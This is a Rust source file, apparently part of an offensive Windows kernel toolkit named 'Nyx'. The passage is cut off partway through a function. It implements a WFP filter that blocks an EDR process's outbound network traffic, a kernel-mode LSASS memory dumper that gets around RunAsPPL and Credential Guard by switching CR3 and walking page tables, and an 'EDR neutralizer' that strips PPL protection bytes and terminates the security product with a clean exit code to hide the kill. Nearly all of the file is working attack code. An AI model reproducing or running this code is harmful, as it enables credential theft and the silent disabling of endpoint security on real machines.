/// `wfp_filter0_field_offsets_match_sdk`):
/// ```text
///   0   filterKey          GUID                 (16)
///   16  displayData        FWPM_DISPLAY_DATA0   { wchar_t* name; wchar_t* desc }
///   32  flags              UINT32
///   40  providerKey        GUID*                (8, align 8)
///   48  providerData       FWP_BYTE_BLOB        (16)
///   64  layerKey           GUID
///   80  subLayerKey        GUID
///   96  weight             FWP_VALUE0           { UINT32 type; union (8) @104 }
///   112 numFilterConditions UINT32
///   120 filterCondition    FWPM_FILTER_CONDITION0*
///   128 action             FWPM_ACTION0         { UINT32 type; GUID union @132 } (20)
///   152 rawContext/providerContext union { UINT64; GUID } (16, align 8)
///   168 reserved           GUID*  ← a POINTER in the SDK, not an embedded GUID
///   176 filterId           UINT64 (OUT)
///   184 effectiveWeight    FWP_VALUE0           (16)
/// ```
#[cfg(any(target_os = "windows", test))]
#[repr(C)]
struct FwpmFilter0 {
    filter_key: Guid,                               // 0: zero = auto-generate
    display_name: *const u16, // 16: FWPM_DISPLAY_DATA0.name (static "NyxWfpKit")
    display_desc: *const u16, // 24: FWPM_DISPLAY_DATA0.description (null)
    flags: u32,               // 32: FWPM_FILTER_FLAG_NONE = 0 (never PERSISTENT)
    provider_key: *const Guid, // 40: null
    provider_data: FwpByteBlob, // 48: empty
    layer_key: Guid,          // 64: FWPM_LAYER_ALE_AUTH_CONNECT_V4
    sublayer_key: Guid,       // 80: NYX_WFP_SUBLAYER (never GUID_NULL/UNIVERSAL)
    weight_type: u32,         // 96: FWP_UINT8 — highest range inside our sublayer
    weight_value: u64,        // 104: FWP_VALUE0 union (uint8 in the low byte)
    num_filter_conditions: u32, // 112: ALWAYS 1 — see P0-9 below
    filter_conditions: *const FwpmFilterCondition0, // 120
    action_type: u32,         // 128: FWPM_ACTION0.type = FWP_ACTION_BLOCK
    action_guid: Guid,        // 132: FWPM_ACTION0 union (unused for block)
    raw_context: [u64; 2],    // 152: { UINT64 rawContext; GUID providerContext } union (16 bytes)
    reserved: *const Guid,    // 168: SDK reserved pointer — always null
    filter_id: u64,           // 176: OUT (0 on input)
    effective_weight_type: u32, // 184: FWP_VALUE0 (OUT)
    effective_weight_value: u64, // 192: FWP_VALUE0 union (OUT)
}

#[cfg(any(target_os = "windows", test))]
impl FwpmFilter0 {
    /// Build an outbound block filter on `ALE_AUTH_CONNECT_V4` conditioned on
    /// exactly one AppId condition. `conditions` must point at a single
    /// [`FwpmFilterCondition0`] (from [`ale_app_id_condition`]) that stays
    /// valid until `FwpmFilterAdd0` returns.
    ///
    /// **SECURITY (P0-9):** `num_filter_conditions` is hard-wired to 1. Per
    /// the WFP contract, 0 conditions means *"match ALL traffic on this
    /// layer"* — every outbound IPv4 packet on the host, not just the EDR's.
    /// There is deliberately no constructor that can produce that.
    /// Real WFP rejects a filter whose `displayData.name` is NULL with
    /// `FWP_E_NULL_DISPLAY_NAME` (0x80320023 — measured on ARM64 Win11
    /// 26100, 2026-08-16; the mock tests never saw it). A `static` name
    /// trivially outlives the `FwpmFilterAdd0` call.
    fn block_outbound_app_id(conditions: *const FwpmFilterCondition0) -> Self {
        // "NyxWfpKit\0" / "Nyx WFP kit outbound block\0" as UTF-16.
        static NAME: [u16; 10] = [
            'N' as u16, 'y' as u16, 'x' as u16, 'W' as u16, 'f' as u16, 'p' as u16, 'K' as u16,
            'i' as u16, 't' as u16, 0,
        ];
        static DESC: [u16; 27] = [
            'N' as u16, 'y' as u16, 'x' as u16, ' ' as u16, 'W' as u16, 'F' as u16, 'P' as u16,
            ' ' as u16, 'k' as u16, 'i' as u16, 't' as u16, ' ' as u16, 'o' as u16, 'u' as u16,
            't' as u16, 'b' as u16, 'o' as u16, 'u' as u16, 'n' as u16, 'd' as u16, ' ' as u16,
            'b' as u16, 'l' as u16, 'o' as u16, 'c' as u16, 'k' as u16, 0,
        ];
        FwpmFilter0 {
            filter_key: Guid([0; 16]),
            display_name: NAME.as_ptr(),
            display_desc: DESC.as_ptr(),
            flags: 0,
            provider_key: core::ptr::null(),
            provider_data: FwpByteBlob {
                size: 0,
                data: core::ptr::null_mut(),
            },
            layer_key: LAYER_ALE_AUTH_CONNECT_V4,
            sublayer_key: NYX_WFP_SUBLAYER,
            weight_type: FWP_UINT8,
            weight_value: FWP_FILTER_WEIGHT_MAX_RANGE,
            num_filter_conditions: 1,
            filter_conditions: conditions,
            action_type: FWP_ACTION_BLOCK,
            action_guid: Guid([0; 16]),
            raw_context: [0; 2],
            reserved: core::ptr::null(),
            filter_id: 0,
            effective_weight_type: 0,
            effective_weight_value: 0,
        }
    }
}

// ---- pid → AppId resolution (Windows-only plumbing) ----

/// PROCESS_QUERY_LIMITED_INFORMATION (0x1000) — the minimum access needed for
/// QueryFullProcessImageNameW; works against more targets than full
/// PROCESS_QUERY_INFORMATION (protected-light processes still refuse, which
/// is a legitimate Err, not a fallback trigger).
#[cfg(target_os = "windows")]
const PROCESS_QUERY_LIMITED_INFORMATION: u32 = 0x1000;

/// Resolve a pid to its image path as a NUL-terminated UTF-16 buffer, in the
/// drive-letter form `FwpmGetAppIdFromFileName0` accepts.
///
/// Any failure (process exited, access denied / PPL) is a hard `Err` — the
/// caller NEVER falls back to an unconditioned filter.
#[cfg(target_os = "windows")]
fn resolve_image_path_wide(pid: u32) -> Result<Vec<u16>, KitError> {
    use core::ffi::c_void;

    type OpenProcessFn = unsafe extern "system" fn(u32, i32, u32) -> *mut c_void;
    type QueryFullProcessImageNameWFn =
        unsafe extern "system" fn(*mut c_void, u32, *mut u16, *mut u32) -> i32;
    type CloseHandleFn = unsafe extern "system" fn(*mut c_void) -> i32;

    let open_process: OpenProcessFn =
        unsafe { crate::win::resolve::resolve_sym(b"kernel32.dll", b"OpenProcess") }
            .map_err(|_| KitError::Other("OpenProcess unresolved".into()))?;
    let query_name: QueryFullProcessImageNameWFn =
        unsafe { crate::win::resolve::resolve_sym(b"kernel32.dll", b"QueryFullProcessImageNameW") }
            .map_err(|_| KitError::Other("QueryFullProcessImageNameW unresolved".into()))?;
    let close_handle: CloseHandleFn =
        unsafe { crate::win::resolve::resolve_sym(b"kernel32.dll", b"CloseHandle") }
            .map_err(|_| KitError::Other("CloseHandle unresolved".into()))?;

    let h_process = unsafe { open_process(PROCESS_QUERY_LIMITED_INFORMATION, 0, pid) };
    if h_process.is_null() {
        return Err(KitError::Other(format!(
            "OpenProcess(QUERY_LIMITED_INFORMATION) failed for pid {} — process exited or \
             access denied (PPL/protected); refusing to install an unconditioned filter",
            pid
        )));
    }

    let mut buf = [0u16; 1024];
    let mut size: u32 = buf.len() as u32;
    let ok = unsafe { query_name(h_process, 0, buf.as_mut_ptr(), &mut size) };
    let _ = unsafe { close_handle(h_process) };
    if ok == 0 || size == 0 || size as usize >= buf.len() {
        return Err(KitError::Other(format!(
            "QueryFullProcessImageNameW failed for pid {} — cannot resolve the image path; \
             refusing to install an unconditioned filter",
            pid
        )));
    }

    let mut path = Vec::with_capacity(size as usize + 1);
    path.extend_from_slice(&buf[..size as usize]);
    path.push(0); // NUL-terminate for the PCWSTR FFI arg
    Ok(path)
}

#[cfg(target_os = "windows")]
fn wide_nul_to_string(w: &[u16]) -> String {
    let n = w.iter().position(|&c| c == 0).unwrap_or(w.len());
    w[..n]
        .iter()
        .map(|&c| char::from_u32(c as u32).unwrap_or('\u{FFFD}'))
        .collect()
}

/// Owned AppId blob returned by `FwpmGetAppIdFromFileName0`. The BFE allocates
/// it, so it MUST be released with `FwpmFreeMemory0` (not the process heap) —
/// the Drop impl does exactly that. Keep it alive until `FwpmFilterAdd0` has
/// copied the condition out (see [`PreparedFilter`]).
#[cfg(target_os = "windows")]
struct AppIdBlob {
    blob: *mut FwpByteBlob,
}

#[cfg(target_os = "windows")]
impl AppIdBlob {
    /// pid → image path → AppId blob. Any failure returns `Err` before a blob
    /// exists — there is no fallback path. Also returns the Win32 image path
    /// and the BFE blob size for live diagnostics.
    fn for_pid(pid: u32) -> Result<(Self, String, u32), KitError> {
        type FwpmGetAppIdFromFileName0Fn =
            unsafe extern "system" fn(*const u16, *mut *mut FwpByteBlob) -> u32;
        let get_app_id: FwpmGetAppIdFromFileName0Fn = unsafe {
            crate::win::resolve::resolve_sym(b"fwpuclnt.dll", b"FwpmGetAppIdFromFileName0")
        }
        .map_err(|_| wfp_unresolved("FwpmGetAppIdFromFileName0"))?;

        let path = resolve_image_path_wide(pid)?;
        let mut blob: *mut FwpByteBlob = core::ptr::null_mut();
        let st = unsafe { get_app_id(path.as_ptr(), &mut blob) };
        if st != 0 || blob.is_null() {
            return Err(match wfp_status_env_limit(st) {
                Some(why) => KitError::Other(format!(
                    "env_limit:{why} (FwpmGetAppIdFromFileName0 pid {pid}={st})"
                )),
                None => KitError::Other(format!(
                    "FwpmGetAppIdFromFileName0 failed for pid {pid}: {st}"
                )),
            });
        }
        let len = unsafe { (*blob).size };
        Ok((Self { blob }, wide_nul_to_string(&path), len))
    }
}

#[cfg(target_os = "windows")]
impl Drop for AppIdBlob {
    fn drop(&mut self) {
        type FwpmFreeMemory0Fn = unsafe extern "system" fn(*mut *mut core::ffi::c_void);
        if !self.blob.is_null() {
            if let Ok(free) = unsafe {
                crate::win::resolve::resolve_sym::<FwpmFreeMemory0Fn>(
                    b"fwpuclnt.dll",
                    b"FwpmFreeMemory0",
                )
            } {
                let mut p = self.blob as *mut core::ffi::c_void;
                let _ = unsafe { free(&mut p) };
            }
            // Null regardless of free success: Drop must be idempotent.
            self.blob = core::ptr::null_mut();
        }
    }
}

/// Everything `FwpmFilterAdd0` must see alive for the duration of the call:
/// the BFE-owned AppId blob plus the one-element condition array that points
/// at it. Build the `FWPM_FILTER0` via [`Self::filter`], pass it to
/// `FwpmFilterAdd0`, and only then drop this value — the blob is released
/// (via `FwpmFreeMemory0`) after the add has copied the condition.
///
/// **SECURITY (P0-9):** the previous implementation installed a filter with
/// `num_filter_conditions = 0` ("match ALL outbound IPv4" — silently cutting
/// the host's whole network) and was replaced by an always-`Err` stub. This
/// type is the real fix: WFP has no PID filter condition, so the filter is
/// conditioned on `FWPM_CONDITION_ALE_APP_ID`, resolved from the target's
/// image path. Any resolution failure returns `Err` BEFORE a filter exists.
#[cfg(target_os = "windows")]
struct PreparedFilter {
    // Held purely for its Drop (FwpmFreeMemory0 on the BFE-owned blob) — the
    // filter reaches the blob's memory through `condition`, not this field.
    #[allow(dead_code)]
    app_id: AppIdBlob,
    condition: FwpmFilterCondition0,
    image_path: String,
    app_id_len: u32,
}

#[cfg(target_os = "windows")]
impl PreparedFilter {
    fn block_outbound_for_pid(pid: u32) -> Result<Self, KitError> {
        let (app_id, image_path, app_id_len) = AppIdBlob::for_pid(pid)?;
        let condition = ale_app_id_condition(app_id.blob);
        Ok(Self {
            app_id,
            condition,
            image_path,
            app_id_len,
        })
    }

    /// The `FWPM_FILTER0` to hand to `FwpmFilterAdd0`. Borrows
    /// `self.condition` (and transitively the AppId blob) — both outlive the
    /// add call by construction at the call site.
    fn filter(&self) -> FwpmFilter0 {
        FwpmFilter0::block_outbound_app_id(&self.condition)
    }
}

// ---- §4 CredKit -----------------------------------------------------------

/// Kernel-mode LSASS reader: reads LSASS process memory directly via the
/// KernelRw primitive (CR3 switch + VA walk), bypassing RunAsPPL + Credential
/// Guard. The user-mode Nyx `hashdump` reads the SAM hive; this is its
/// kernel-tier upgrade.
///
/// **Coverage (kernelsdk-2-2):** the dump reads a 1 MiB window at the image
/// base, sparse-tolerant (unmapped pages are zero-filled, not fatal). The
/// heap-resident credential regions (cached DPAPI, Kerberos tickets) are NOT
/// inside that window — reading them needs additional
/// [`KernelLsassReader::read_process_mem_skip_unmapped`] calls at their
/// resolved addresses.
///
/// **Algorithm:** to read LSASS memory from the kernel you must
/// switch CR3 to LSASS's DTB (directory base), read the target VAs, restore
/// CR3. The DTB comes from LSASS's EPROCESS.DirectoryTableBase. Under HVCI
/// the CR3 write is itself a code-page op (mov cr3) — needs the unchecked
/// PatchGuard window; on HVCI-off it's a single kwrite to CR3.
pub struct KernelLsassReader {
    /// Resolved KVA of `PsActiveProcessHead`. Required by `dump_lsass` to
    /// walk the process list and find LSASS's EPROCESS by PID.
    pub ps_active_process_head_kva: usize,
    /// Build-resolved EPROCESS field offsets.
    pub offsets: EprocessOffsets,
}

/// The EPROCESS.DirectoryTableBase offset (the DTB / PML4 physical base).
/// Constant across 17763 + Win10/11 x64 (it's an early field, never drifted).
pub const DIRECTORY_TABLE_BASE: usize = 0x028;

impl KernelLsassReader {
    /// Resolve the base VA of `lsass.exe` inside the target process by
    /// reading the target's PEB `ImageBaseAddress`.
    ///
    /// Returns `None` if the PEB pointer is zero, the DTB read fails, or
    /// the resulting image base is zero (e.g. Win11 24H2+ KASLR restriction
    /// without `SeDebugPrivilege`).
    ///
    /// This is **much safer than the old fixed VA `0x1_0000_0000`**, which
    /// was never mapped on modern ASLR-enabled hosts and caused silent
    /// all-zero reads.
    fn lsass_image_base(
        &self,
        krw: &dyn KernelRw,
        eprocess_kva: usize,
        _pid: u32,
    ) -> Option<usize> {
        // 1. Read the target EPROCESS's DirectoryTableBase (DTB / CR3).
        let dtb = krw.kread_u64(eprocess_kva + DIRECTORY_TABLE_BASE).ok()?;
        if dtb == 0 {
            return None;
        }

        // 2. Read the target EPROCESS's PEB pointer.
        // The PEB offset is build-specific and comes from the authoritative
        // offsets table (Vergilius cross-checked) — no Option/fallback here.
        let peb_off = self.offsets.peb;
        let peb_ptr = krw.kread_u64(eprocess_kva + peb_off).ok()? as usize;
        if peb_ptr == 0 {
            return None;
        }

        // 3. Read ImageBaseAddress from the PEB (offset 0x010 on x64).
        // The PEB lives in the target process's *user* address space, so a
        // plain kernel/physical kread_u64 would read the wrong bytes. We must
        // translate the VA through the target's DTB via read_process_mem
        // (which walks the 4-level page tables), then parse little-endian.
        let mut ib = [0u8; 8];
        let buf = Self::read_process_mem(krw, eprocess_kva, peb_ptr + 0x010, 8).ok()?;
        ib.copy_from_slice(&buf);
        let image_base = u64::from_le_bytes(ib);

        // 4. On Win11 24H2+ the kernel may zero ImageBase for callers
        // without SeDebugPrivilege. Treat a zero base as "unresolved".
        if image_base == 0 {
            return None;
        }

        Some(image_base as usize)
    }
}

impl KernelLsassReader {
    /// Read `len` bytes from `vaddr` in the process whose EPROCESS is at
    /// `eprocess_kva`, by switching CR3 to that process's DTB.
    ///
    /// The CR3 switch is the dangerous part: between writing CR3 and reading,
    /// the *current* process's address space is wrong — so the read must use
    /// physical addressing or a kernel-space VA that's global. The page walk
    /// here uses [`KrwPhysRead`] to translate VAs via the target's DTB (the
    /// real impl does a 4-level page-table walk from the DTB to physical,
    /// then reads physical). That walk is the bulk of the work; this is the
    /// orchestration shell.
    ///
    /// ## Address-space contract (kernelsdk-2-1)
    /// This function reads the target's EPROCESS DTB with a virtual-address
    /// `kread`, then walks + reads page tables and payload through physical
    /// addresses. It therefore requires a `KernelRw` whose `kread` interprets
    /// addresses as **physical** (see [`KernelRwAddressSpace::Physical`]) —
    /// the base VA-based impls (Shield `ByovdDriver`, `LivingOffDefender`,
    /// `VaKernelRw`) fail the walk with a clear error, not garbage. Every
    /// physical address is validated with [`is_plausible_phys_address`]
    /// before use, so a VA/PA mix-up errors out instead of silently returning
    /// unrelated bytes.
    ///
    /// Strict: ANY unmapped page aborts the whole read (use
    /// [`Self::read_process_mem_skip_unmapped`] for sparse regions).
    pub fn read_process_mem(
        krw: &dyn KernelRw,
        eprocess_kva: usize,
        vaddr: usize,
        len: usize,
    ) -> Result<Vec<u8>, KitError> {
        Self::read_process_mem_impl(krw, eprocess_kva, vaddr, len, false)
    }

    /// Like [`Self::read_process_mem`], but **skips non-present pages**: any
    /// page whose page-table walk hits a not-present level is zero-filled and
    /// the read continues. A sparse VA range (e.g. the 1 MiB window at an
    /// image base, with gaps between sections and beyond the last section)
    /// therefore returns a full-size buffer instead of aborting the whole
    /// read on the first unmapped page. Real I/O failures (driver IOCTL
    /// errors) still abort — only *unmapped* pages are skipped.
    ///
    /// This is the variant `dump_lsass` uses; [`Self::read_process_mem`] stays
    /// strict for callers that need integrity (e.g. the PEB `ImageBaseAddress`
    /// probe, which must fail if the PEB page is unmapped).
    pub fn read_process_mem_skip_unmapped(
        krw: &dyn KernelRw,
        eprocess_kva: usize,
        vaddr: usize,
        len: usize,
    ) -> Result<Vec<u8>, KitError> {
        Self::read_process_mem_impl(krw, eprocess_kva, vaddr, len, true)
    }

    /// Shared loop for [`Self::read_process_mem`] and
    /// [`Self::read_process_mem_skip_unmapped`].
    fn read_process_mem_impl(
        krw: &dyn KernelRw,
        eprocess_kva: usize,
        vaddr: usize,
        len: usize,
        skip_unmapped: bool,
    ) -> Result<Vec<u8>, KitError> {
        // 1. Read the target's DTB: kread_u64(eprocess + DIRECTORY_TABLE_BASE).
        let dtb = krw
            .kread_u64(eprocess_kva + DIRECTORY_TABLE_BASE)
            .map_err(KitError::from)?;
        if dtb == 0 {
            return Err(KitError::UnsupportedPosture("target DTB is zero"));
        }
        // A DTB must be a physical address (the PML4 base). A virtual-looking
        // DTB means the EPROCESS read went through a physical-addressing impl
        // (or the EPROCESS KVA was mis-translated) — refuse rather than walk
        // junk page tables.
        if !is_plausible_phys_address(dtb) {
            return Err(KitError::UnsupportedPosture(
                "target DTB is not a physical address — read_process_mem requires a \
                 physical-addressing KernelRw for the page-walk reads (KernelRwAddressSpace)",
            ));
        }
        // 2. Wrap the KernelRw as a PhysRead adapter — every physical read is
        //    validated by is_plausible_phys_address inside read_phys.
        let reader = KrwPhysRead { krw };
        // 3. Read `len` bytes from `vaddr`, page-boundary aware.
        let mut out = Vec::with_capacity(len);
        let mut remaining = len;
        let mut cur_va = vaddr as u64;
        while remaining > 0 {
            let page_off = (cur_va & 0xFFF) as usize;
            let bytes_in_page = 0x1000 - page_off;
            let chunk = remaining.min(bytes_in_page);
            let pa = match crate::pagewalk::translate_va(&reader, dtb, cur_va) {
                Ok(pa) => pa,
                Err(e) if skip_unmapped => match e {
                    // Unmapped page: zero-fill this chunk and continue. The
                    // dump must not abort on a sparse region — gaps between
                    // image sections are expected.
                    crate::pagewalk::PhysReadError::NotPresent { .. } => {
                        out.resize(out.len() + chunk, 0u8);
                        cur_va += chunk as u64;
                        remaining -= chunk;
                        continue;
                    }
                    // Real I/O failure (driver IOCTL, address overflow): still
                    // abort — only unmapped pages are skipped.
                    other => {
                        return Err(KitError::Other(alloc::format!("page walk: {:?}", other)));
                    }
                },
                Err(e) => {
                    return Err(KitError::Other(alloc::format!("page walk: {:?}", e)));
                }
            };
            // The walk returned a translated page — it must be a physical
            // address. A virtual-looking PA means the KernelRw is not
            // physical-addressing (VA/PA mix-up): refuse, don't read garbage.
            if !is_plausible_phys_address(pa) {
                return Err(KitError::UnsupportedPosture(
                    "page walk returned a virtual-looking address — the KernelRw is not \
                     physical-addressing (KernelRwAddressSpace)",
                ));
            }
            let mut buf = alloc::vec![0u8; chunk];
            reader
                .read_phys(pa, &mut buf)
                .map_err(|e| KitError::Other(alloc::format!("physical read: {:?}", e)))?;
            out.extend_from_slice(&buf);
            cur_va += chunk as u64;
            remaining -= chunk;
        }
        Ok(out)
    }
}

impl CredKit for KernelLsassReader {
    fn dump_lsass(&self, krw: &dyn KernelRw, pid: u32) -> Result<Vec<u8>, KitError> {
        // Delegate to dump_lsass_with_base; the bytes are the same.
        self.dump_lsass_with_base(krw, pid).map(|(b, _)| b)
    }

    fn dump_lsass_with_base(
        &self,
        krw: &dyn KernelRw,
        pid: u32,
    ) -> Result<(Vec<u8>, u64), KitError> {
        // 1. Resolve LSASS's EPROCESS by walking PsActiveProcessHead.
        if self.ps_active_process_head_kva == 0 {
            return Err(KitError::UnsupportedPosture(
                "PsActiveProcessHead KVA unresolved for dump_lsass — \
                 bootstrap must fill KernelLsassReader.ps_active_process_head_kva",
            ));
        }
        let eprocess_kva =
            ProcessHider::find_eprocess(krw, self.ps_active_process_head_kva, pid, &self.offsets)?;
        // 2. Read the LSASS user-mode VA range. The raw bytes are returned;
        // the operator wraps them in a minidump envelope at the call site
        // (crates/minidump-assembler) using the base VA returned here.
        //
        // COVERAGE LIMITATION (kernelsdk-2-2): this reads the 1 MiB window at
        // the image base. The credential regions (LsaEncryptMemory / DPAPI
        // keys, Kerberos cache — msv1_0/wdigest/tspkg, PKINIT tickets) live in
        // the process HEAP and other VAs, NOT inside this window — this dump
        // is the mapped image + its neighborhood, not a full-memory dump.
        // Reading the credential regions requires additional
        // read_process_mem_skip_unmapped calls at their resolved addresses.
        //
        // Locate the actual lsass.exe image base inside the target process
        // by reading the PEB's `ImageBaseAddress`. Reading the FAIL-soft
        // fixed VA 0x1_0000_0000 always returned zeros / unmapped memory
        // on ASLR-enabled hosts.
        let user_mode_base = self
            .lsass_image_base(krw, eprocess_kva, pid)
            .ok_or_else(|| {
                KitError::UnsupportedPosture(
                    "dump_lsass: could not resolve lsass.exe ImageBaseAddress — \
                 VAD walk required",
                )
            })?;
        let read_size: usize = 0x10_0000; // 1 MiB initial read
                                          // Skip non-present pages (kernelsdk-2-2): the 1 MiB window at the
                                          // image base is sparse — gaps between sections and beyond the last
                                          // section are unmapped. Zero-fill those instead of aborting the dump.
        let bytes =
            Self::read_process_mem_skip_unmapped(krw, eprocess_kva, user_mode_base, read_size)?;
        Ok((bytes, user_mode_base as u64))
    }
}

// ---- §2.5 EdrNeutralizeKit ------------------------------------------------

/// EDR process neutralizer. Kill (data-write PPL strip + user-mode
/// TerminateProcess, bypasses PPL) is the only tier that needs a KernelRw;
/// Freeze + Choke are user-mode.
///
/// The `EdrNeutralizeKit` trait's `neutralize()` doesn't pass a `KernelRw`,
/// so the Kill tier exposes [`EdrNeutralizer::kill`], which takes one directly.
/// The operator calls `kill()` when they have kernel R/W access;
/// `neutralize(Kill)` refuses and points at `kill()` (it cannot strip PPL
/// without a `KernelRw`, so a bare user-mode terminate attempt against a
/// protected target would be a false-positive machine).
pub struct EdrNeutralizer {
    /// Resolved KVA of `PsActiveProcessHead`. Required by the Kill tier to
    /// walk the process list and find the target EPROCESS by PID.
    pub ps_active_process_head_kva: usize,
    /// Build-resolved EPROCESS field offsets.
    pub offsets: EprocessOffsets,
}

/// The saved `Protection` / `SignatureLevel` / `SectionSignatureLevel` bytes
/// of a process, captured before a PPL strip so the strip can be rolled back
/// if the follow-up terminate fails (see [`EdrNeutralizer::kill`]).
struct ProtectionSnapshot {
    protection: u8,
    signature_level: u8,
    section_signature_level: u8,
}

impl ProtectionSnapshot {
    /// Read the three protection bytes of `eprocess_kva`, then zero them
    /// (same data-only strip as `PplStripper::strip_protection`, but with the
    /// pre-strip bytes captured for rollback). HVCI-safe: data writes only.
    fn strip(
        krw: &dyn KernelRw,
        eprocess_kva: usize,
        offsets: &EprocessOffsets,
    ) -> Result<Self, KitError> {
        // A non-canonical EPROCESS KVA means find_eprocess returned garbage;
        // writing protection bytes there would corrupt unrelated kernel memory.
        if eprocess_kva < 0xFFFF_8000_0000_0000 {
            return Err(KitError::UnsupportedPosture(
                "non-canonical EPROCESS KVA — refusing to strip protection on a corrupt address",
            ));
        }
        let rd = |off: usize| -> Result<u8, KitError> {
            let mut b = [0u8; 1];
            krw.kread(eprocess_kva + off, &mut b)
                .map_err(KitError::from)?;
            Ok(b[0])
        };
        let snap = ProtectionSnapshot {
            protection: rd(offsets.protection)?,
            signature_level: rd(offsets.signature_level)?,
            section_signature_level: rd(offsets.section_signature_level)?,
        };
        krw.kwrite(eprocess_kva + offsets.protection, &[0u8])
            .map_err(KitError::from)?;
        krw.kwrite(eprocess_kva + offsets.signature_level, &[0u8])
            .map_err(KitError::from)?;
        krw.kwrite(eprocess_kva + offsets.section_signature_level, &[0u8])
            .map_err(KitError::from)?;
        Ok(snap)
    }

    /// Write the saved bytes back. Called when the terminate step fails so a
    /// failed Kill never leaves the target silently unprotected.
    fn restore(
        &self,
        krw: &dyn KernelRw,
        eprocess_kva: usize,
        offsets: &EprocessOffsets,
    ) -> Result<(), KitError> {
        krw.kwrite(eprocess_kva + offsets.protection, &[self.protection])
            .map_err(KitError::from)?;
        krw.kwrite(
            eprocess_kva + offsets.signature_level,
            &[self.signature_level],
        )
        .map_err(KitError::from)?;
        krw.kwrite(
            eprocess_kva + offsets.section_signature_level,
            &[self.section_signature_level],
        )
        .map_err(KitError::from)?;
        Ok(())
    }
}

/// Terminate `pid` from user mode (`OpenProcess(PROCESS_TERMINATE)` +
/// `TerminateProcess`). Only viable after [`ProtectionSnapshot::strip`] has
/// removed the target's PPL — a protected-light process refuses the open.
/// Windows-only FFI (kernel32); every failure propagates.
#[cfg(target_os = "windows")]
fn terminate_process_user_mode(pid: u32) -> Result<(), KitError> {
    use core::ffi::c_void;

    /// PROCESS_TERMINATE = 0x0001 — sufficient once PPL is stripped.
    const PROCESS_TERMINATE: u32 = 0x0001;

    type OpenProcessFn = unsafe extern "system" fn(u32, i32, u32) -> *mut c_void;
    type TerminateProcessFn = unsafe extern "system" fn(*mut c_void, u32) -> i32;
    type CloseHandleFn = unsafe extern "system" fn(*mut c_void) -> i32;

    let open_process: OpenProcessFn =
        unsafe { crate::win::resolve::resolve_sym(b"kernel32.dll", b"OpenProcess") }
            .map_err(|_| KitError::Other("OpenProcess unresolved".into()))?;
    let terminate_process: TerminateProcessFn =
        unsafe { crate::win::resolve::resolve_sym(b"kernel32.dll", b"TerminateProcess") }
            .map_err(|_| KitError::Other("TerminateProcess unresolved".into()))?;
    let close_handle: CloseHandleFn =
        unsafe { crate::win::resolve::resolve_sym(b"kernel32.dll", b"CloseHandle") }
            .map_err(|_| KitError::Other("CloseHandle unresolved".into()))?;

    let h_process = unsafe { open_process(PROCESS_TERMINATE, 0, pid) };
    if h_process.is_null() {
        return Err(KitError::Other(format!(
            "OpenProcess(PROCESS_TERMINATE) failed for pid {} after PPL strip — \
             access denied (no SeDebugPrivilege?) or the process already exited",
            pid
        )));
    }
    // Exit code 0 (STATUS_SUCCESS) — the EDR dies looking like a clean exit.
    let ok = unsafe { terminate_process(h_process, 0) };
    let _ = unsafe { close_handle(h_process) };
    if ok == 0 {
        return Err(KitError::Other(format!(
            "TerminateProcess failed for pid {} after PPL strip",
            pid
        )));
    }
    Ok(())
}

#[cfg(not(target_os = "windows"))]
fn terminate_process_user_mode(_pid: u32) -> Result<(), KitError> {
    Err(KitError::UnsupportedPosture(
        "user-mode TerminateProcess is Windows-only",
    ))
}

impl EdrNeutralizer {
    /// Resolve the target process's `EPROCESS` KVA by walking
    /// `PsActiveProcessHead` (via `ProcessHider::find_eprocess` — real kernel
    /// R/W). This is the resolution half of the Kill tier, kept public for
    /// operators whose driver exposes a native terminate IOCTL
    /// (`ObOpenObjectByPointer` + `ZwTerminateProcess`) and only need the KVA.
    pub fn resolve_target_eprocess(&self, krw: &dyn KernelRw, pid: u32) -> Result<usize, KitError> {
        if self.ps_active_process_head_kva == 0 {
            return Err(KitError::UnsupportedPosture(
                "PsActiveProcessHead KVA unresolved for Kill tier — \
                 bootstrap must fill EdrNeutralizer.ps_active_process_head_kva",
            ));
        }
        ProcessHider::find_eprocess(krw, self.ps_active_process_head_kva, pid, &self.offsets)
    }

    /// Kill an EDR (PPL) process. **This really terminates the target** — it
    /// does not just resolve an address and hand off.
    ///
    /// # Why not a pure data-write kill
    ///
    /// With only `kread`/`kwrite` + resolved offsets there is no *sound*
    /// write-only termination:
    /// - NULLing `EPROCESS.Token` crashes the KERNEL, not the process: access
    ///   checks (`SeAccessCheck` via `PsReferencePrimaryToken`) dereference the
    ///   token — a NULL token is a ring-0 NULL-deref → BSOD. Forbidden.
    /// - Corrupting `DirectoryTableBase` faults the next context switch into
    ///   any thread of the target with a garbage CR3; the page-fault handler
    ///   itself then can't be fetched → double fault → BSOD. Forbidden.
    /// - Unlinking `ActiveProcessLinks` (DKOM) only HIDES the process; its
    ///   threads keep running — that is `ProcessHider`, not a kill.
    /// - `PspTerminateProcess` via a queued kernel APC needs a code-execution
    ///   primitive the `KernelRw` contract deliberately excludes (HVCI-safe
    ///   data-write doctrine).
    ///
    /// # What this does instead (strongest sound version)
    ///
    /// 1. Walk `PsActiveProcessHead` → target `EPROCESS` by PID.
    /// 2. Snapshot + strip PPL: zero `Protection` / `SignatureLevel` /
    ///    `SectionSignatureLevel` (data-only, HVCI-safe — same writes as
    ///    `PplStripper`, with rollback bytes captured).
    /// 3. User-mode `OpenProcess(PROCESS_TERMINATE)` + `TerminateProcess` —
    ///    now unblocked because the process is no longer protected.
    /// 4. On any failure of step 3, **roll the protection bytes back** and
    ///    return the terminate error (a failed Kill never leaves the EDR
    ///    silently unprotected). On success the EPROCESS is being torn down by
    ///    the kernel, so the strip is intentionally left in place.
    ///
    /// Returns the (now-dying) target's `EPROCESS` KVA for operator logging.
    pub fn kill(&self, krw: &dyn KernelRw, pid: u32) -> Result<usize, KitError> {
        self.kill_with(krw, pid, terminate_process_user_mode)
    }

    /// `kill` with the terminate step injected. The production path passes
    /// [`terminate_process_user_mode`]; host tests inject a stub so the
    /// success / terminate-failure / rollback-failure paths are exercisable
    /// without a live Windows target. Never callable from outside netsec.rs —
    /// the injection seam is test-only.
    fn kill_with(
        &self,
        krw: &dyn KernelRw,
        pid: u32,
        terminate: impl FnOnce(u32) -> Result<(), KitError>,
    ) -> Result<usize, KitError> {
        let eprocess_kva = self.resolve_target_eprocess(krw, pid)?;
        let snapshot = ProtectionSnapshot::strip(krw, eprocess_kva, &self.offsets)?;
        match terminate(pid) {
            Ok(()) => Ok(eprocess_kva),
            Err(term_err) => match snapshot.restore(krw, eprocess_kva, &self.offsets) {
                // Rollback OK: surface the terminate failure.
                Ok(()) => Err(term_err),
                // Worst case: neither the kill nor the rollback completed —
                // the target is alive but unprotected. Say so explicitly.
